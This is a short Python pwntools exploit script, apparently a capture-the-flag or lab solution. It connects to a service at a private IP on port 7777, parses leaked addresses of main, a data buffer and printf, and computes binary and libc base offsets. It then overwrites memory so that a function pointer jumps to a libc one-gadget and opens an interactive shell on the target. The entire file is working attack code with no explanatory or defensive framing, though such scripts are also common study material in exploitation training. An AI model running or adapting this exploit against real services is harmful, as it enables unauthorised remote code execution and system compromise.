from pwn import *

context.arch = "amd64"

s = connect("172.18.90.7", 7777)

s.recvuntil("main: 0x")
main = int(s.recvline()[:-1], 16)
s.recvuntil("data[0]: 0x")
data0 = int(s.recvline()[:-1], 16)
s.recvuntil("printf: 0x")
printf = int(s.recvline()[:-1], 16)

def get(index, data):
  s.sendlineafter("> ", "%d %d"%(0, index))
  s.sendline(data)

def put(index):
  s.sendlineafter("> ", "%d %d"%(1, index))
  return s.recvline()[:-1]

base = main - 0x1199
put = base + 0x1351

libc = printf - 0x64e10
rce = libc + 0x54f89

get(2, pack(put)+pack(rce))

get(0, b"a"*0x18 + pack(data0 + 0x48))

get(1, "")

s.interactive()
